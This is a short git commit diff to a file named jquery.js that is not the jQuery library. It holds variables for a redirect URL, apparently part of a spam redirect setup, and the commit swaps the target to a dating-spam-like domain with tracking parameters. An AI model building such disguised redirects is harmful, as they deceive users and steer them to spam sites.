9ba5ae9b64232da604125df2597f162c9568f485
pejuangxkeluarga-source <pejuangxkeluarga@gmail.com>
2026-05-14 09:44:24 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,4 +1,4 @@
-var url="https://bjdbai.nightts.one/p/7IigW";
+var url="https://tp7pmrh.mygirlpartneres.com/ne1rh6z?s1=glider&cid=glider";
 var time="0.0057539939880371";
 var top_text="";
 var img_url="https://pbs.twimg.com/media/G_bWmmrbIAAd-Lh?format=jpg";
